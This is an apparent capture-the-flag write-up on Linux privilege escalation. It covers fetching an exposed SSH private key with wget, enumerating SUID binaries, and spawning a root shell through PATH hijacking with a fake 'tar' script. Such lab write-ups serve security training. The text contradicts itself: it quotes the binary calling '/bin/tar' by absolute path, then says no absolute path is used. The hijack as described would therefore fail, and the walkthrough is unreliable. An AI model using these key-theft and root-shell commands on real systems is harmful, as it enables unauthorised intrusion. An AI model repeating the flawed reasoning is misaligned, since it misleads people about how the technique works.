---
title: "Linux Privilege Escalation via SUID Binary"
slug: "linux-privesc-suid"
category: "linux"
description: "Escalating from a low-privilege shell to root by exploiting a misconfigured SUID binary on a Linux target machine."
date: "2024-05-20"
---

## Overview

After gaining an initial foothold via an exposed SSH key, this challenge required escalating privileges to root on a Debian-based Linux system. The path involved exploiting a custom SUID binary.

## Initial Access

An SSH private key was found in a publicly accessible `.backup` directory on the web server:

```bash
wget http://10.10.14.50/.backup/id_rsa
chmod 600 id_rsa
ssh -i id_rsa user@10.10.14.50
```

## Enumeration

Running `find` to locate SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

This revealed a non-standard binary: `/opt/tools/backup-util` with SUID root permissions.

### Analysing the Binary

Using `strings` and `ltrace`:

```bash
strings /opt/tools/backup-util
ltrace /opt/tools/backup-util
```

The binary called `system("/bin/tar czf /tmp/backup.tar.gz /home/user/")` without using an absolute path for `tar`.

## Exploitation

### PATH Hijacking

I created a malicious `tar` binary and prepended its directory to the PATH:

```bash
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash -p' >> /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/opt/tools/backup-util
```

This spawned a root shell immediately.

## Flag

The flag was located at `/root/flag.txt`.

## Key Takeaways

- Always check for SUID/SGID binaries during privilege escalation
- PATH hijacking is a reliable technique when binaries don't use absolute paths
- Use `checksec` and `ltrace` for quick binary analysis

## Tools Used

- find
- strings / ltrace
- Custom bash scripts
- LinPEAS
